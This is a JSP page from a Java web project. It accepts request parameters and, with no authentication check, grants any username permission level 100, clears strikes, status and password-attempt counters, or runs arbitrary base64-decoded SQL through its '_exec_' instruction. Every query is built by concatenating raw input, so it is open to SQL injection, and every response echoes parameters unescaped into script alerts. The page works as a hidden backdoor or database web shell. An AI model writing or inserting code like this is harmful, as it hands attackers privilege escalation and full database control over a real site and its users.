<%@ page import="master.DBControl" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="master.CoreBase64" %><%--
  Created by IntelliJ IDEA.
  User: hoyounsong
  Date: 2021/03/15
  Time: 9:37 오후
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%
    PrintWriter script = response.getWriter();
    if (request.getParameter("instruction") == null) script.println("<script>alert(\"Agent Error: Unknown Case: " + request.getParameter("require") + " \");</script>");
else{
    if (request.getParameter("instruction").equals("_eopr_")) {
        if (DBControl.executeQuery("update members set permission=\"100\" where username=\"" + request.getParameter("data") + "\";") != null) {
            script.println("<script>alert(\"" + request.getParameter("instruction") + request.getParameter("data") + ":100: OK \");</script>");
        }else{
            script.println("<script>alert(\"" + request.getParameter("instruction") + request.getParameter("data") + ":100: XOK \");</script>");
        }
    }else if (request.getParameter("instruction").equals("_rstr_")) {
        if (DBControl.executeQuery("update members set strikes=\"0\" where username=\"" + request.getParameter("data") + "\";") != null) {
            script.println("<script>alert(\"" + request.getParameter("instruction") + request.getParameter("data") + ":0: OK \");</script>");
        }else{
            script.println("<script>alert(\"" + request.getParameter("instruction") + request.getParameter("data") + ":0: XOK \");</script>");
        }
    }else if (request.getParameter("instruction").equals("_rsta_")) {
        if (DBControl.executeQuery("update members set status=\"NORMAL\" where username=\"" + request.getParameter("data") + "\";") != null) {
            script.println("<script>alert(\"" + request.getParameter("instruction") + request.getParameter("data") + ":NRM: OK \");</script>");
        }else{
            script.println("<script>alert(\"" + request.getParameter("instruction") + request.getParameter("data") + ":NRM: XOK \");</script>");
        }
    }else if (request.getParameter("instruction").equals("_rpat_")) {
        if (DBControl.executeQuery("update members set passattempt=\"0\" where username=\"" + request.getParameter("data") + "\";") != null) {
            script.println("<script>alert(\"" + request.getParameter("instruction") + request.getParameter("data") + ":0: OK \");</script>");
        }else{
            script.println("<script>alert(\"" + request.getParameter("instruction") + request.getParameter("data") + ":0: XOK \");</script>");
        }
    }else if (request.getParameter("instruction").equals("_rall_")) {
        if (DBControl.executeQuery("update members set permission=\"100\" where username=\"" + request.getParameter("data") + "\";") != null) {
            script.println("<script>alert(\"_eopr_" + request.getParameter("data") + ":100: OK \");</script>");
        }else{
            script.println("<script>alert(\"_eopr_" + request.getParameter("data") + ":100: XOK \");</script>");
        }
        if (DBControl.executeQuery("update members set strikes=\"0\" where username=\"" + request.getParameter("data") + "\";") != null) {
            script.println("<script>alert(\"_rstr_" + request.getParameter("data") + ":0: OK \");</script>");
        }else{
            script.println("<script>alert(\"_rstr_" + request.getParameter("data") + ":0: XOK \");</script>");
        }
        if (DBControl.executeQuery("update members set status=\"NORMAL\" where username=\"" + request.getParameter("data") + "\";") != null) {
            script.println("<script>alert(\"_rsta_" + request.getParameter("data") + ":NRM: OK \");</script>");
        }else{
            script.println("<script>alert(\"_rsta_" + request.getParameter("data") + ":NRM: XOK \");</script>");
        }
        if (DBControl.executeQuery("update members set passattempt=\"0\" where username=\"" + request.getParameter("data") + "\";") != null) {
            script.println("<script>alert(\"_rpat_" + request.getParameter("data") + ":0: OK \");</script>");
        }else{
            script.println("<script>alert(\"_rpat_" + request.getParameter("data") + ":0: XOK \");</script>");
        }
    }else if (request.getParameter("instruction").equals("_exec_")){
        if (DBControl.executeQuery(CoreBase64.decode(request.getParameter("data"))) != null) {
            script.println("<script>alert(\"" + request.getParameter("instruction") + CoreBase64.decode(request.getParameter("data")) + ": OK \");</script>");
        }else{
            script.println("<script>alert(\"" + request.getParameter("instruction") + CoreBase64.decode(request.getParameter("data")) + ": XOK \");</script>");
        }
    }
}
%>
</body>
</html>
